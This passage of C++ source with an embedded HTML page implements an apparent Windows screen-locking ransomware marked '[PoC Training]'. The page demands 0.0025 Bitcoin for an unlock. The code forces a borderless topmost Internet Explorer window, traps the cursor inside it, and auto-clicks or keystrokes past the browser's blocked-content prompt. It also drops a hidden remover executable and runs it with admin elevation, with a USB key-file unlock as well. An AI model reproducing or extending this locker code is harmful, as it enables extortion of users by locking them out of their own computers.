<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Unlock Request</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            padding: 40px;
            max-width: 600px;
            width: 90%;
            text-align: center;
        }
        .header h1 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 2.0em;
            font-weight: 700;
            white-space: nowrap;
            overflow: hidden;
        }
        .subtitle {
            color: #7f8c8d;
            font-size: 1.1em;
            margin-bottom: 30px;
        }
        .info-box {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 30px;
        }
        .info-box h2 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 1.4em;
        }
        .info-text {
            color: #6c757d;
            line-height: 1.6;
            font-size: 1em;
        }
        .input-section {
            margin-bottom: 30px;
        }
        .input-section label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #495057;
            text-align: left;
        }
        .input-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        #userIdInput {
            flex: 1;
            padding: 12px 16px;
            border: 2px solid #28a745;
            border-radius: 6px;
            font-size: 1em;
            background-color: #f0fff0;
            color: #28a745;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
            font-weight: bold;
            cursor: default;
        }
        #userIdInput:focus {
            outline: none;
            border-color: #28a745;
        }
        #confirmBtn {
            padding: 12px 24px;
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 80px;
        }
        #confirmBtn:hover {
            background: linear-gradient(135deg, #218838 0%, #1aa085 100%);
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
        }
        .status-message {
            padding: 15px;
            border-radius: 6px;
            margin-top: 15px;
            font-weight: 600;
        }
        .status-message.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 System Access Recovery</h1>
            <p class="subtitle">[PoC Training] Unlock Request Portal</p>
        </div>
        
        <div class="content">
            <div class="info-box">
                <h2>System Unlock Process</h2>
                <p class="info-text">
                    Send 0.0025 Bitcoin to the account below. After sending, click 'Confirm' to proceed with unlocking. Failure to send will result in rejection.
                    <br>
                    xxx-xxxx-xxx
                </p>
            </div>
            
            <div class="input-section">
                <label for="userIdInput">Your User ID:</label>
                <div class="input-group">
                    <input type="text" id="userIdInput" value=")html" + actualUserID + R"html(" readonly>
                    <button id="confirmBtn" onclick="processUnlock()">Confirm</button>
                </div>
            </div>
            
            <div id="statusMessage" class="status-message hidden">
                <span id="statusText">Processing...</span>
            </div>
        </div>
    </div>
    
    <script>
        function processUnlock() {
            // 버튼 비활성화 및 상태 변경
            const confirmBtn = document.getElementById('confirmBtn');
            const statusMessage = document.getElementById('statusMessage');
            const statusText = document.getElementById('statusText');
            
            confirmBtn.disabled = true;
            confirmBtn.textContent = 'Processing...';
            
            // 상태 메시지 표시
            statusMessage.classList.remove('hidden');
            statusText.textContent = 'Sending unlock request to server...';
            
            // C++에 신호를 보내기 위해 창의 제목을 변경
            document.title = 'UNLOCK_REQUEST_SENT';
            
            // 추가적인 확인을 위해 콘솔에도 로그 출력
            console.log('Unlock request sent - Title changed to: ' + document.title);
            
            // 5초 후에도 응답이 없으면 타임아웃 메시지 표시
            setTimeout(function() {
                if (document.title === 'UNLOCK_REQUEST_SENT') {
                    statusText.textContent = 'Processing... Please wait.';
                    console.log('Still processing after 5 seconds');
                }
            }, 5000);
            
            // 10초 후에는 에러 메시지 표시
            setTimeout(function() {
                if (document.title === 'UNLOCK_REQUEST_SENT') {
                    statusText.textContent = 'Taking longer than expected. Please wait...';
                    console.log('Processing taking longer than expected');
                }
            }, 10000);
        }
    </script>
</body>
</html>
)html";

    return htmlContent;
}

void ScreenLocker::OpenControlledBrowser() {
   // Prevent duplicate browser execution
   if (browserRunning) {
       SaveToLogFile(userID, "BROWSER_ALREADY_RUNNING_IGNORED");
       return;
   }
   browserRunning = true;

   // Reset COM
   HRESULT hrInit = CoInitialize(NULL);
   if (FAILED(hrInit) && hrInit != RPC_E_CHANGED_MODE) {
       SaveToLogFile(userID, "COM_INITIALIZATION_FAILED");
       browserRunning = false;
       return;
   }

   IWebBrowser2* pWebBrowser = NULL;
   BSTR url = NULL;

   do {
       // Create HTML File with UserID pre-filled
       char exePath[MAX_PATH];
       GetModuleFileNameA(NULL, exePath, MAX_PATH);
       std::string exeDir = exePath;
       size_t lastSlash = exeDir.find_last_of("\\");
       if (lastSlash != std::string::npos) {
           exeDir = exeDir.substr(0, lastSlash);
       }
       
       std::string htmlFile = exeDir + "\\unlock.html";
       std::string htmlContent = GenerateHTMLContent();  // 이미 UserID가 삽입됨
       
       std::ofstream file(htmlFile);
       file << htmlContent;
       file.close();
       
       // Create file:// URL
       std::replace(htmlFile.begin(), htmlFile.end(), '\\', '/');
       std::wstring wHtmlFile(htmlFile.begin(), htmlFile.end());
       std::wstring htmlPath = L"file:///" + wHtmlFile;
       url = SysAllocString(htmlPath.c_str());

       // Create Internet Explorer Instance
       HRESULT hr = CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_LOCAL_SERVER, IID_IWebBrowser2, (void**)&pWebBrowser);
       if (FAILED(hr) || !pWebBrowser) {
           break;
       }

       // Browser Settings
       pWebBrowser->put_Visible(VARIANT_TRUE);
       pWebBrowser->put_ToolBar(VARIANT_FALSE);
       pWebBrowser->put_StatusBar(VARIANT_FALSE);
       pWebBrowser->put_MenuBar(VARIANT_FALSE);
       pWebBrowser->put_AddressBar(VARIANT_FALSE);
       pWebBrowser->put_Silent(VARIANT_TRUE);

       // Calculate Position and Size
       int screenWidth = GetSystemMetrics(SM_CXSCREEN);
       int screenHeight = GetSystemMetrics(SM_CYSCREEN);
       int xPos = (screenWidth - BROWSER_WIDTH) / 2;
       int yPos = (screenHeight - BROWSER_HEIGHT) / 2;

       pWebBrowser->put_Left(xPos);
       pWebBrowser->put_Top(yPos);
       pWebBrowser->put_Width(BROWSER_WIDTH);
       pWebBrowser->put_Height(BROWSER_HEIGHT);

       // Navigate to HTML File
       if (!url) {
           break;
       }

       VARIANT varURL;
       VariantInit(&varURL);
       varURL.vt = VT_BSTR;
       varURL.bstrVal = url;

       hr = pWebBrowser->Navigate2(&varURL, NULL, NULL, NULL, NULL);
       VariantClear(&varURL);

       if (FAILED(hr)) {
           break;
       }

       // Find and Control Browser Window
       for (int attempts = 0; attempts < 20; attempts++) {
           Sleep(200);
           hr = pWebBrowser->get_HWND((SHANDLE_PTR*)&browserHwnd);
           if (browserHwnd) break;
           
           if (FindBrowserWindow()) break;
       }

       if (browserHwnd) {
           ControlBrowserWindow();
       }
       
       // 3초 후 자동 허용 (보안 기능을 위해)
       Sleep(3000);
       ClickAllowButton();
       
       SaveToLogFile(userID, "BROWSER_OPENED_CONTROLLED");
       
   } while (false);

   // 리소스 정리
   if (url) SysFreeString(url);
   if (pWebBrowser) pWebBrowser->Release();

   if (SUCCEEDED(hrInit)) {
       CoUninitialize();
   }
}

// Window priority control functions
void ScreenLocker::SetScreenLockerTopmost() {
    if (hWnd) {
        SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        SetForegroundWindow(hWnd);
        SaveToLogFile(userID, "SCREENLOCKER_SET_TOPMOST");
    }
}

void ScreenLocker::SetBrowserTopmost() {
    if (browserHwnd) {
        // Set browser above screen locker
        SetWindowPos(browserHwnd, HWND_TOPMOST, 0, 0, 0, 0, 
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
        SetForegroundWindow(browserHwnd);
        BringWindowToTop(browserHwnd);
        SaveToLogFile(userID, "BROWSER_SET_TOPMOST");
    }
}

void ScreenLocker::RestoreScreenLockerTopmost() {
    // Restore screen locker as topmost
    SetScreenLockerTopmost();
    SaveToLogFile(userID, "SCREENLOCKER_TOPMOST_RESTORED");
}

bool ScreenLocker::FindBrowserWindow() {
    // Try to get browser window handle
    browserHwnd = FindWindow(L"IEFrame", NULL);
    if (browserHwnd) {
        SaveToLogFile(userID, "BROWSER_WINDOW_FOUND");
        return true;
    }
    return false;
}

void ScreenLocker::ControlBrowserWindow() {
    if (!browserHwnd) return;
    
    // Calculate center position
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int xPos = (screenWidth - BROWSER_WIDTH) / 2;
    int yPos = (screenHeight - BROWSER_HEIGHT) / 2;
    
    // Remove title bar and set properties
    SetWindowLong(browserHwnd, GWL_STYLE, WS_POPUP | WS_VISIBLE);
    SetWindowLong(browserHwnd, GWL_EXSTYLE, WS_EX_TOPMOST | WS_EX_TOOLWINDOW);
    
    // Position and set as topmost
    SetWindowPos(browserHwnd, HWND_TOPMOST, xPos, yPos, BROWSER_WIDTH, BROWSER_HEIGHT, 
                SWP_FRAMECHANGED | SWP_SHOWWINDOW);
    
    // Set browser as topmost (above screen locker)
    SetBrowserTopmost();
    
    // Confine cursor to browser
    ConfineCursorToBrowser();
    
    SaveToLogFile(userID, "BROWSER_WINDOW_CONTROLLED_MINIMAL_INPUT");
}

void ScreenLocker::ClickAllowButton() {
    if (!browserHwnd) return;
    
    SaveToLogFile(userID, "ATTEMPTING_ACTIVEX_ALLOW");
    
    // First, try to click the UI button
    HWND infoBar = FindWindowEx(browserHwnd, NULL, L"Internet Explorer_TridentCmboBx", NULL);
    if (!infoBar) {
        infoBar = FindWindowEx(browserHwnd, NULL, L"CommandBarClass", NULL);
    }
    
    if (infoBar) {
        // Find allow button and click
        HWND allowButton = FindWindowEx(infoBar, NULL, L"Button", NULL);
        while (allowButton) {
            WCHAR buttonText[100];
            GetWindowText(allowButton, buttonText, 100);
            
            // Find button with "허용" or "Allow" text
            if (wcsstr(buttonText, L"허용") || wcsstr(buttonText, L"Allow") || 
                wcsstr(buttonText, L"차단된 콘텐츠 허용")) {
                
                SaveToLogFile(userID, "FOUND_ALLOW_BUTTON_CLICKING");
                // Click the UI button (no need for system mode)
                SendMessage(allowButton, BM_CLICK, 0, 0);
                SaveToLogFile(userID, "ALLOW_BUTTON_CLICKED_SUCCESS");
                return;
            }
            
            allowButton = FindWindowEx(infoBar, allowButton, L"Button", NULL);
        }
    }
    
    // If no UI button, use keyboard shortcut (minimum time)
    SaveToLogFile(userID, "NO_UI_BUTTON_USING_KEYBOARD_SHORTCUT");
    
    // ↓↓↓ Activate system mode for a very short time ↓↓↓
    SetSystemActionMode(true);
    
    // Simulate Alt+A key
    keybd_event(VK_MENU, 0, 0, 0);  // Press Alt
    keybd_event('A', 0, 0, 0);      // Press A
    keybd_event('A', 0, KEYEVENTF_KEYUP, 0);  // Release A
    keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);  // Release Alt
    
    // ↓↓↓ Immediately deactivate system mode ↓↓↓
    SetSystemActionMode(false);
    
    SaveToLogFile(userID, "ALLOW_SHORTCUT_COMPLETED");
}

void ScreenLocker::ConfineCursorToBrowser() {
    if (!browserHwnd || !IsWindow(browserHwnd)) {
        SaveToLogFile(userID, "CURSOR_CONFINE_FAILED_NO_BROWSER");
        return;
    }
    
    // Get browser window position and size
    RECT browserRect;
    if (GetWindowRect(browserHwnd, &browserRect)) {
        ClipCursor(&browserRect);
        SaveToLogFile(userID, "CURSOR_CONFINED_TO_BROWSER");
    } else {
        SaveToLogFile(userID, "CURSOR_CONFINE_FAILED_GET_RECT");
    }
}

void ScreenLocker::ReleaseCursorConfinement() {
    ClipCursor(NULL);
    SaveToLogFile(userID, "CURSOR_CONFINEMENT_RELEASED");
}

bool ScreenLocker::ExtractRemoverExecutable() {
    try {
        // Find the resource
        HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(Constants::RemoverResourceID), RT_RCDATA);
        if (!hResource) {
            SaveToLogFile(userID, "RESOURCE_FIND_FAILED");
            return false;
        }
        
        // Load the resource
        HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
        if (!hLoadedResource) {
            SaveToLogFile(userID, "RESOURCE_LOAD_FAILED");
            return false;
        }
        
        // Get resource data and size
        LPVOID pResourceData = LockResource(hLoadedResource);
        DWORD resourceSize = SizeofResource(NULL, hResource);
        
        if (!pResourceData || resourceSize == 0) {
            SaveToLogFile(userID, "RESOURCE_DATA_INVALID");
            return false;
        }
        
        // Create target directory
        char programDataPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) != S_OK) {
            SaveToLogFile(userID, "PROGRAMDATA_PATH_FAILED");
            return false;
        }
        
        std::string targetDir = std::string(programDataPath) + Constants::ProgramDataDir;
        std::string targetPath = targetDir + "\\" + Constants::RemoverExeName;
        
        // Create directory
        if (!CreateDirectoryA(targetDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
            SaveToLogFile(userID, "TARGET_DIRECTORY_CREATE_FAILED");
            return false;
        }
        
        // Write resource to file
        HANDLE hFile = CreateFileA(targetPath.c_str(), GENERIC_WRITE, 0, NULL, 
                                  CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            SaveToLogFile(userID, "TARGET_FILE_CREATE_FAILED");
            return false;
        }
        
        DWORD bytesWritten;
        BOOL writeResult = WriteFile(hFile, pResourceData, resourceSize, &bytesWritten, NULL);
        CloseHandle(hFile);
        
        if (!writeResult || bytesWritten != resourceSize) {
            SaveToLogFile(userID, "FILE_WRITE_FAILED");
            return false;
        }
        
        SaveToLogFile(userID, "REMOVER_EXTRACTED_SUCCESS: " + targetPath);
        return true;
        
    } catch (...) {
        SaveToLogFile(userID, "REMOVER_EXTRACTION_EXCEPTION");
        return false;
    }
}

std::string ScreenLocker::GetRemoverPath() {
    char programDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programDataPath) == S_OK) {
        return std::string(programDataPath) + Constants::ProgramDataDir + "\\" + Constants::RemoverExeName;
    }
    return "";
}

bool ScreenLocker::ExecuteRemoverWithAdmin() {
    std::string removerPath = GetRemoverPath();
    
    if (removerPath.empty()) {
        SaveToLogFile(userID, "REMOVER_PATH_NOT_FOUND");
        return false;
    }
    
    // Check if remover file exists
    DWORD fileAttr = GetFileAttributesA(removerPath.c_str());
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        SaveToLogFile(userID, "REMOVER_FILE_NOT_EXISTS");
        return false;
    }
    
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";  // Request admin elevation
    sei.lpFile = removerPath.c_str();
    sei.lpParameters = "";
    sei.nShow = SW_NORMAL;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    
    if (ShellExecuteExA(&sei)) {
        SaveToLogFile(userID, "REMOVER_SHELLEXECUTE_SUCCESS");
        
        if (sei.hProcess) {
            // Wait for the process to complete
            DWORD waitResult = WaitForSingleObject(sei.hProcess, 30000); // 30 second timeout
            
            if (waitResult == WAIT_OBJECT_0) {
                DWORD exitCode;
                if (GetExitCodeProcess(sei.hProcess, &exitCode)) {
                    if (exitCode == 0) {
                        SaveToLogFile(userID, "REMOVER_COMPLETED_SUCCESS");
                        CloseHandle(sei.hProcess);
                        return true;
                    } else {
                        SaveToLogFile(userID, "REMOVER_COMPLETED_WITH_ERROR: " + std::to_string(exitCode));
                    }
                }
            } else if (waitResult == WAIT_TIMEOUT) {
                SaveToLogFile(userID, "REMOVER_EXECUTION_TIMEOUT");
            }
            
            CloseHandle(sei.hProcess);
        }
    } else {
        DWORD error = GetLastError();
        if (error == ERROR_CANCELLED) {
            SaveToLogFile(userID, "REMOVER_UAC_CANCELLED_BY_USER");
        } else {
            SaveToLogFile(userID, "REMOVER_SHELLEXECUTE_FAILED: " + std::to_string(error));
        }
    }
    
    return false;
}

void ScreenLocker::HandleUnlockProcess() {
    SaveToLogFile(userID, "UNLOCK_PROCESS_STARTED");
    
    // 1. Open controlled browser
    OpenControlledBrowser();

    if (browserHwnd) {
        SaveToLogFile(userID, "WAITING_FOR_BROWSER_SIGNAL");
        bool signalReceived = false;
        
        // Wait for 30 seconds for browser signal (simplified loop)
        for (int i = 0; i < 120; i++) {
            // Check if browser window still exists
            if (!IsWindow(browserHwnd)) {
                SaveToLogFile(userID, "BROWSER_WINDOW_DESTROYED_BY_USER");
                break;
            }

            // If browser window is hidden, show it again
            if (!IsWindowVisible(browserHwnd)) {
                ShowWindow(browserHwnd, SW_RESTORE);
                SetBrowserTopmost();
            }

            // Check for unlock signal in browser window title
            wchar_t title[256] = { 0 };
            GetWindowTextW(browserHwnd, title, 255);
            
            std::wstring titleStr(title);
            if (titleStr.find(Constants::UnlockSignal) != std::wstring::npos) {
                SaveToLogFile(userID, "UNLOCK_SIGNAL_RECEIVED");
                signalReceived = true;
                SendMessage(browserHwnd, WM_CLOSE, 0, 0);
                break;
            }
            
            Sleep(250); // Check every 0.25 seconds
        }

        // Release cursor confinement
        ReleaseCursorConfinement();

        // 2. If signal received, execute remover program immediately
        if (signalReceived) {
            SaveToLogFile(userID, "BROWSER_SIGNAL_CONFIRMED_EXECUTING_REMOVER");
            
            if (ExecuteRemoverWithAdmin()) {
                SaveToLogFile(userID, "REMOVER_EXECUTION_INITIATED");
                PostMessage(hWnd, WM_DESTROY, 0, 0);
            } else {
                SaveToLogFile(userID, "REMOVER_EXECUTION_FAILED_OR_CANCELLED");
                MessageBoxW(hWnd, L"Removal process was cancelled or failed.\nPlease try again.", 
                           L"Action Required", MB_OK | MB_ICONWARNING);
                RestoreScreenLockerTopmost();
            }
        } else {
            // Timeout or user closed the window
            SaveToLogFile(userID, "BROWSER_SIGNAL_TIMEOUT_OR_CANCELLED");
            MessageBoxW(hWnd, L"Request timeout or cancelled. Please try again.", 
                       L"Timeout", MB_OK | MB_ICONWARNING);
            RestoreScreenLockerTopmost();
        }
    } else {
        SaveToLogFile(userID, "BROWSER_CREATION_FAILED");
        MessageBoxW(hWnd, L"Failed to open unlock interface.\nPlease try again.", 
                   L"Error", MB_OK | MB_ICONERROR);
        RestoreScreenLockerTopmost();
    }
    
    // Initialize browser state
    browserRunning = false;
    browserHwnd = nullptr;
    
    SaveToLogFile(userID, "UNLOCK_PROCESS_COMPLETED");
}

// [NEW FEATURE] Handles device change events to detect USB drives.
void ScreenLocker::HandleDeviceChange(LPARAM lParam) {
    PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;

    if (lpdb != NULL && lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME) {
        PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;

        // Check for device arrival (e.g., USB stick inserted)
        if (lpdbv->dbcv_flags == 0) { 
            // Iterate through the bitmask to find the drive letter
            for (char i = 0; i < 26; ++i) {
                if ((lpdbv->dbcv_unitmask >> i) & 1) {
                    char driveLetter = 'A' + i;
                    SaveToLogFile(userID, "USB_DRIVE_DETECTED: " + std::string(1, driveLetter));
                    // Check if this USB is our emergency key
                    CheckUsbForKey(driveLetter);
                }
            }
        }
    }
}

// [NEW FEATURE] Checks a given USB drive for the key file and executes the remover.
void ScreenLocker::CheckUsbForKey(char driveLetter) {
    std::string drive = std::string(1, driveLetter) + ":\\";
    std::string keyFilePath = drive + Constants::UsbUnlockKeyFile;
    std::string removerPath = drive + Constants::UsbRemoverExeName;

    // 1. Check if the key file exists.
    if (GetFileAttributesA(keyFilePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        SaveToLogFile(userID, "UNLOCK_KEY_FILE_FOUND_ON_DRIVE: " + std::string(1, driveLetter));

        // 2. If key is found, check if the remover executable also exists.
        if (GetFileAttributesA(removerPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            SaveToLogFile(userID, "USB_REMOVER_FOUND_EXECUTING: " + removerPath);

            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas"; // Request admin elevation
            sei.lpFile = removerPath.c_str();
            sei.lpParameters = "";
            sei.nShow = SW_SHOWNORMAL;
            sei.fMask = 0;

            // 3. Execute the remover with admin rights.
            if (!ShellExecuteExA(&sei)) {
                DWORD error = GetLastError();
                SaveToLogFile(userID, "USB_REMOVER_EXECUTION_FAILED: " + std::to_string(error));
            }
            // If execution is successful, the remover will terminate this process.
        } else {
            SaveToLogFile(userID, "UNLOCK_KEY_FOUND_BUT_REMOVER_MISSING: " + removerPath);
        }
    }
}